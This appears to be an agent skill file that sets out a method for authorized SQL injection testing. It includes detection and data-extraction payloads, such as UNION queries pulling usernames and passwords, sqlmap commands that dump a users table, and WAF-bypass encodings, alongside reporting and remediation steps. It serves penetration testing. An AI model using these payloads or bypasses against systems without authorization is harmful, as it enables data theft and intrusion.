---
name: sql-injection-testing
description: Professional skills and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing Skill

## Overview

SQL injection is a common and dangerous web application vulnerability. This skill provides a systematic methodology for SQL injection testing, including detection techniques and exploitation strategies.

## Testing Methods

### 1. Parameter Identification
- Identify all user input points: URL parameters, POST data, HTTP headers, cookies, etc.
- Focus on parameters such as: id, search, filter, sort
- Use Burp Suite or similar tools to intercept and modify requests

### 2. Basic Detection
- Single-quote test: `'` - check whether a SQL error appears
- Boolean-based blind: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind: `' AND SLEEP(5)--`
- Union query: `' UNION SELECT NULL--`

### 3. Database Identification
- MySQL: `' AND @@version LIKE '%mysql%'--`
- PostgreSQL: `' AND version() LIKE '%PostgreSQL%'--`
- MSSQL: `' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information Extraction
- Database name: `' UNION SELECT database()--`
- Table names: `' UNION SELECT table_name FROM information_schema.tables--`
- Column names: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Tool Usage

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify a parameter
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify the database type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Get the list of databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Get tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Get data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use the Repeater module in Burp Suite
- Use the browser developer tools
- Write Python scripts to automate testing

## Bypass Techniques

### WAF Bypass
- Encoding bypass: URL encoding, Unicode encoding, hex encoding
- Comment bypass: `/**/`, `--`, `#`
- Mixed case: `SeLeCt`, `UnIoN`
- Whitespace substitution: `/**/`, `+`, `%09` (Tab), `%0A` (newline)

### Examples
```
Original: ' UNION SELECT NULL--
Bypass 1: '/**/UNION/**/SELECT/**/NULL--
Bypass 2: '%55nion%20select%20null--
Bypass 3: '/*!UNION*//*!SELECT*/null--
```

## Verification and Reporting

### Verification Steps
1. Confirm that SQL statements can be executed
2. Extract database information to verify
3. Assess the scope of impact (data leakage, privilege escalation, etc.)
4. Record a complete PoC (request/response)
5. Record the confirmed vulnerability in the platform via the `report_finding` tool (the only entry point for recording vulnerabilities on this platform); fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Reporting Essentials
- Vulnerability location and parameter
- Affected data and systems
- Complete exploitation steps
- Remediation recommendations (parameterized queries, input validation, etc.)

## Notes

- Only perform in authorized test environments
- Avoid damaging production data
- Use dangerous operations such as DROP and DELETE with caution
- Record all testing steps for reproducibility
